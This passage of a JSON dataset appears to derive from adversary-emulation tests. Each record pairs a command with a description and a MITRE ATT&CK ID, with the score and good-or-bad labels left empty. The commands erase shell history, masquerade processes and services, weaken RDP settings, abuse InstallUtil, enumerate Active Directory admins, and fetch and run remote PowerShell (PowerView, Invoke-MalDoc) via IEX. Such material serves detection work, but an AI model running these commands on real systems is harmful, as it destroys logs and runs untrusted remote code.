        "Description": "Clears bash history via echo\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.003",
        "Shell": "sh"
    },
    {
        "ID": 1014,
        "Command": "cat /dev/null > ~/.bash_history\n",
        "Description": "Clears bash history via cat /dev/null\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.003",
        "Shell": "sh"
    },
    {
        "ID": 1015,
        "Command": "ln -sf /dev/null ~/.bash_history\n",
        "Description": "Clears bash history via a symlink to /dev/null\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.003",
        "Shell": "sh"
    },
    {
        "ID": 1016,
        "Command": "truncate -s0 ~/.bash_history\n",
        "Description": "Clears bash history via truncate\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.003",
        "Shell": "sh"
    },
    {
        "ID": 1017,
        "Command": "unset HISTFILE\nexport HISTFILESIZE=0\nhistory -c\n",
        "Description": "Clears the history of a bunch of different shell types by setting the history size to zero\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.003",
        "Shell": "sh"
    },
    {
        "ID": 1018,
        "Command": "set +o history\necho 'set +o history' >> ~/.bashrc\n. ~/.bashrc\nhistory -c\n",
        "Description": "Clears the history and disable bash history logging of the current shell and future shell sessions\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.003",
        "Shell": "bash"
    },
    {
        "ID": 1019,
        "Command": "hostname\nwhoami\n",
        "Description": "Using a space before a command causes the command to not be logged in the Bash History file\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.003",
        "Shell": "sh"
    },
    {
        "ID": 1020,
        "Command": "sshpass -p 'pwd101!' ssh testuser1@localhost -T hostname\n",
        "Description": "Keeps history clear and stays out of lastlog,wtmp,btmp ssh -T keeps the ssh client from catching a proper TTY, which is what usually gets logged on lastlog\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.003",
        "Shell": "sh"
    },
    {
        "ID": 1021,
        "Command": "docker container prune -f && sudo truncate -s 0 /var/lib/docker/containers/*/*-json.log\n",
        "Description": "Clears Docker container logs using the Docker CLI and the truncate command, removing all log entries.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.003",
        "Shell": "bash"
    },
    {
        "ID": 1022,
        "Command": "Set-PSReadlineOption -HistorySaveStyle SaveNothing\n",
        "Description": "Prevents Powershell history\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.003",
        "Shell": "powershell"
    },
    {
        "ID": 1023,
        "Command": "Remove-Item (Get-PSReadlineOption).HistorySavePath\n",
        "Description": "Clears Powershell history\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.003",
        "Shell": "powershell"
    },
    {
        "ID": 1024,
        "Command": "Set-PSReadLineOption -AddToHistoryHandler { return $false }\n",
        "Description": "The \"AddToHistoryHandler\" receives the current command as the $line variable and then returns $true if \nthe line should be written to the history file. Here we simply return $false so nothing gets added to \nthe history file for the current session. \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.003",
        "Shell": "powershell"
    },
    {
        "ID": 1025,
        "Command": "Clear-History\n",
        "Description": "This technique involves using the Clear-History cmdlet in PowerShell to remove all records of previously executed commands.\nThis action is often performed by attackers to eliminate traces of their activities, making incident detection and forensic \ninvestigation more challenging. By clearing the session history, adversaries aim to obfuscate their operational footprint.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1070.003",
        "Shell": "powershell"
    },
    {
        "ID": 1026,
        "Command": "schtasks /create /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1\" /tn win32times /f\nschtasks /query /tn win32times\n",
        "Description": "Creating W32Time similar named service (win32times) using schtasks just like threat actor dubbed \"Operation Wocao\"",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 1027,
        "Command": "sc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\"\nsc qc win32times\n",
        "Description": "Creating W32Time similar named service (win32times) using sc just like threat actor dubbed \"Operation Wocao\"",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.004",
        "Shell": "command_prompt"
    },
    {
        "ID": 1028,
        "Command": "/tmp/T1036_004_prctl_rename & ps\nTMP=`ps | grep totally_legit`\nif [ -z \"${TMP}\" ] ; then echo \"renamed process NOT FOUND in process list\" && exit 1; fi\nexit 0\n",
        "Description": "Runs a C program that calls prctl(PR_SET_NAME) to modify /proc/pid/comm value to \"totally_legit\".  This will show up as process name in simple 'ps' listings.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.004",
        "Shell": "sh"
    },
    {
        "ID": 1029,
        "Command": "eval '(while true; do :; done) &'\necho $! > /tmp/evil_pid.txt\nrandom_kernel_pid=$(ps -ef | grep \"\\[.*\\]\" | awk '{print $2}' | shuf -n 1)\nsudo mount -B /proc/$random_kernel_pid /proc/$(cat /tmp/evil_pid.txt)\n",
        "Description": "Creates a malicious process and hides it by bind mounting to the /proc filesystem of a benign process\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1036.004",
        "Shell": "sh"
    },
    {
        "ID": 1030,
        "Command": "$Server=$ENV:logonserver.TrimStart(\"\\\")\n$User = Join-Path $Env:USERDOMAIN $ENV:USERNAME\n$Password=\"1password2!\"\ncmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password\nmstsc /v:$Server\necho \"RDP connection established\"\n",
        "Description": "Attempt an RDP session via Remote Desktop Application to a DomainController.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.001",
        "Shell": "powershell"
    },
    {
        "ID": 1031,
        "Command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -name \"PortNumber\" -Value 4489\nNew-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489\n",
        "Description": "Changing RDP Port to Non Standard Port via Powershell\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.001",
        "Shell": "powershell"
    },
    {
        "ID": 1032,
        "Command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 4489 /f\nnetsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\" dir=in action=allow protocol=TCP localport=4489\n",
        "Description": "Changing RDP Port to Non Standard Port via Command_Prompt\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1033,
        "Command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f\n",
        "Description": "Disables network-level authentication (NLA) for RDP by changing a registry key via Command Prompt\nDisabling NLA for RDP can allow remote user interaction with the Windows sign-in screen prior to authentication. According to Microsoft, Flax Typhoon actors used this technique implementation to achieve persistence on victim systems: https://www.microsoft.com/en-us/security/blog/2023/08/24/flax-typhoon-using-legitimate-software-to-quietly-access-taiwanese-organizations/\nSee also: https://github.com/EmpireProject/Empire/blob/master/lib/modules/powershell/management/enable_rdp.py\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1021.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 1034,
        "Command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\"\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"T1218.004.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n\\tOutputAssemblyDirectory = $InstallerAssemblyDir\n\\tOutputAssemblyFileName = $InstallerAssemblyFileName\n\\tInvocationMethod = 'CheckIfInstallable'\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n\\tthrow @\"\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "Description": "Executes the CheckIfInstallable class constructor runner instead of executing InstallUtil. Upon execution, the InstallUtil test harness will be executed.\nIf no output is displayed the test executed successfuly.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.004",
        "Shell": "powershell"
    },
    {
        "ID": 1035,
        "Command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\"\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"T1218.004.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n\\tOutputAssemblyDirectory = $InstallerAssemblyDir\n\\tOutputAssemblyFileName = $InstallerAssemblyFileName\n\\tInvocationMethod = 'InstallHelper'\n\\tCommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n\\tthrow @\"\nInstallHelper method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "Description": "Executes the InstallHelper class constructor runner instead of executing InstallUtil. Upon execution, no output will be displayed if the test\nexecuted successfuly.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.004",
        "Shell": "powershell"
    },
    {
        "ID": 1036,
        "Command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\"\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"T1218.004.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_'\n\n$TestArgs = @{\n\\tOutputAssemblyDirectory = $InstallerAssemblyDir\n\\tOutputAssemblyFileName = $InstallerAssemblyFileName\n\\tInvocationMethod = 'Executable'\n\\tCommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n\\tthrow @\"\nInstallUtil class constructor execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "Description": "Executes the installer assembly class constructor. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.004",
        "Shell": "powershell"
    },
    {
        "ID": 1037,
        "Command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\"\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"T1218.004.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=install `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Install_'\n\n$TestArgs = @{\n\\tOutputAssemblyDirectory = $InstallerAssemblyDir\n\\tOutputAssemblyFileName = $InstallerAssemblyFileName\n\\tInvocationMethod = 'Executable'\n\\tCommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n\\tthrow @\"\nInstallUtil Install method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "Description": "Executes the Install Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.004",
        "Shell": "powershell"
    },
    {
        "ID": 1038,
        "Command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\"\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"T1218.004.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /U `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n\\tOutputAssemblyDirectory = $InstallerAssemblyDir\n\\tOutputAssemblyFileName = $InstallerAssemblyFileName\n\\tInvocationMethod = 'Executable'\n\\tCommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n\\tthrow @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "Description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.004",
        "Shell": "powershell"
    },
    {
        "ID": 1039,
        "Command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\"\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"T1218.004.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/logfile= /logtoconsole=false /installtype=notransaction /action=uninstall `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_Uninstall_'\n\n$TestArgs = @{\n\\tOutputAssemblyDirectory = $InstallerAssemblyDir\n\\tOutputAssemblyFileName = $InstallerAssemblyFileName\n\\tInvocationMethod = 'Executable'\n\\tCommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n\\tthrow @\"\nInstallUtil Uninstall method execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "Description": "Executes the Uninstall Method. Upon execution, version information will be displayed the .NET framework install utility.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.004",
        "Shell": "powershell"
    },
    {
        "ID": 1040,
        "Command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\"\n\n$InstallerAssemblyDir = \"$Env:TEMP\\\"\n$InstallerAssemblyFileName = \"T1218.004.dll\"\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"/? `\"$InstallerAssemblyFullPath`\"\"\n$ExpectedOutput = 'Constructor_HelpText_'\n\n$TestArgs = @{\n\\tOutputAssemblyDirectory = $InstallerAssemblyDir\n\\tOutputAssemblyFileName = $InstallerAssemblyFileName\n\\tInvocationMethod = 'Executable'\n\\tCommandLine = $CommandLine\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs\n\nif ($ActualOutput -ne $ExpectedOutput) {\n\\tthrow @\"\nInstallUtil HelpText property execution test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "Description": "Executes the Uninstall Method. Upon execution, help information will be displayed for InstallUtil.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.004",
        "Shell": "powershell"
    },
    {
        "ID": 1041,
        "Command": "# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\n. \"PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1\"\n\n$InstallerAssemblyDir = \"$Env:windir\\System32\\Tasks\"\n$InstallerAssemblyFileName = 'readme.txt'\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\n\n$CommandLine = \"readme.txt\"\n$ExpectedOutput = 'Constructor_'\n\n# Explicitly set the directory so that a relative path to readme.txt can be supplied.\nSet-Location \"$Env:windir\\System32\\Tasks\"\n\nCopy-Item -Path \"$([System.Runtime.InteropServices.RuntimeEnvironment]::GetRuntimeDirectory())InstallUtil.exe\" -Destination \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n\n$TestArgs = @{\n\\tOutputAssemblyDirectory = $InstallerAssemblyDir\n\\tOutputAssemblyFileName = $InstallerAssemblyFileName\n\\tInvocationMethod = 'Executable'\n\\tCommandLine = $CommandLine\n\\tInstallUtilPath = \"$Env:windir\\System32\\Tasks\\notepad.exe\"\n}\n\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\n\nif ($ActualOutput -ne $ExpectedOutput) {\n\\tthrow @\"\nEvasive Installutil invocation test failure. Installer assembly execution output did not match the expected output.\nExpected: $ExpectedOutput\nActual: $ActualOutput\n\"@\n}\n",
        "Description": "Executes an InstallUtil assembly by renaming InstallUtil.exe and using a nonstandard extension for the assembly. Upon execution, \"Running a transacted installation.\"\nwill be displayed, along with other information about the opperation. \"The transacted install has completed.\" will be displayed upon completion.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1218.004",
        "Shell": "powershell"
    },
    {
        "ID": 1042,
        "Command": "net localgroup\nnet group /domain\nnet group \"enterprise admins\" /domain\nnet group \"domain admins\" /domain\n",
        "Description": "Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1043,
        "Command": "get-ADPrincipalGroupMembership $env:USERNAME | select name\n",
        "Description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.002",
        "Shell": "powershell"
    },
    {
        "ID": 1044,
        "Command": "net groups \"Account Operators\" /doma\nnet groups \"Exchange Organization Management\" /doma\nnet group \"BUILTIN\\Backup Operators\" /doma\nnet group /domai \"Domain Admins\"\n",
        "Description": "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This\ntest will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1045,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose\n",
        "Description": "Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.002",
        "Shell": "powershell"
    },
    {
        "ID": 1046,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose\n",
        "Description": "Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.002",
        "Shell": "powershell"
    },
    {
        "ID": 1047,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose\n",
        "Description": "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.002",
        "Shell": "powershell"
    },
    {
        "ID": 1048,
        "Command": "get-aduser -f * -pr DoesNotRequirePreAuth | where {$_.DoesNotRequirePreAuth -eq $TRUE}\n",
        "Description": "When successful, accounts that do not require kerberos pre-auth will be returned\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.002",
        "Shell": "powershell"
    },
    {
        "ID": 1049,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=group) \n",
        "Description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Groups\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1050,
        "Command": "Get-AdGroup -Filter *\n",
        "Description": "The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.002",
        "Shell": "powershell"
    },
    {
        "ID": 1051,
        "Command": "([adsisearcher]\"objectcategory=group\").FindAll(); ([adsisearcher]\"objectcategory=group\").FindOne()\n",
        "Description": "The following Atomic test will utilize ADSISearcher to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.002",
        "Shell": "powershell"
    },
    {
        "ID": 1052,
        "Command": "Get-ADUser -Filter 'useraccountcontrol -band 4194304' -Properties useraccountcontrol | Format-Table name\n",
        "Description": "When successful, accounts that do not require kerberos pre-auth will be returned.\nReference: https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.002",
        "Shell": "powershell"
    },
    {
        "ID": 1053,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"\n",
        "Description": "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.002",
        "Shell": "powershell"
    },
    {
        "ID": 1054,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose\n",
        "Description": "Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.002",
        "Shell": "powershell"
    },
    {
        "ID": 1055,
        "Command": "ldifde.exe -f C:\\Windows\\temp\\atomic_ldifde.txt -p subtree\n",
        "Description": "Output information from Active Directory to a specified file. [Ldifde](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731033(v=ws.11)) is a CLI tool for creating, modifying and deleting directory objects.\nThe test is derived from the CISA Report on Voly Typhoon. Reference: https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1056,
        "Command": "ldapsearch -H ldap://example.com:389 -x -D user@example.com -w s3CurePssw0rD! -b \"CN=Users,DC=example,DC=com\" \"(objectClass=group)\" -s sub -a always -z 1000 dn \n",
        "Description": "Output information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1069.002",
        "Shell": "sh"
    },
    {
        "ID": 1057,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"cscript.exe C:\\Users\\Public\\art.jse`\"`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"\n",
        "Description": "This Test uses a VBA macro to create and execute C:\\Users\\Public\\art.jse with cscript.exe. Upon execution, the .jse file launches wscript.exe.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\nThis is a known execution chain observed by the OSTap downloader commonly used in TrickBot campaigns.\nReferences:\n  https://www.computerweekly.com/news/252470091/TrickBot-Trojan-switches-to-stealthy-Ostap-downloader\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1204.002",
        "Shell": "powershell"
    },
    {
        "ID": 1058,
        "Command": "echo var url = \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\", fso = WScript.CreateObject('Scripting.FileSystemObject'), request, stream; request = WScript.CreateObject('MSXML2.ServerXMLHTTP'); request.open('GET', url, false); request.send(); if (request.status === 200) {stream = WScript.CreateObject('ADODB.Stream'); stream.Open(); stream.Type = 1; stream.Write(request.responseBody); stream.Position = 0; stream.SaveToFile('ostapout.txt', 1); stream.Close();} else {WScript.Quit(1);}WScript.Quit(0); > %TEMP%\\OSTapGet.js\ncscript //E:Jscript %TEMP%\\OSTapGet.js\n",
        "Description": "Uses cscript //E:jscript to download a file\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1204.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 1059,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"  a = Shell(`\"cmd.exe /c choice /C Y /N /D Y /T 3`\", vbNormalFocus)\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"\n",
        "Description": "This Test uses a VBA macro to execute cmd with flags observed in recent maldoc and 2nd stage downloaders. Upon execution, CMD will be launched.\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1204.002",
        "Shell": "powershell"
    },
    {
        "ID": 1060,
        "Command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\n$macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   a = Shell(`\"cmd.exe /c wscript.exe //E:jscript C:\\Users\\Public\\art.jse`\", vbNormalFocus)`n\"\nInvoke-MalDoc -macroCode $macrocode -officeProduct \"Word\"\n",
        "Description": "Malicious JavaScript executing CMD which spawns wscript.exe //e:jscript\nExecution is handled by [Invoke-MalDoc](https://github.com/redcanaryco/invoke-atomicredteam/blob/master/Public/Invoke-MalDoc.ps1) to load and execute VBA code into Excel or Word documents.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1204.002",
        "Shell": "powershell"
    },
    {
        "ID": 1061,
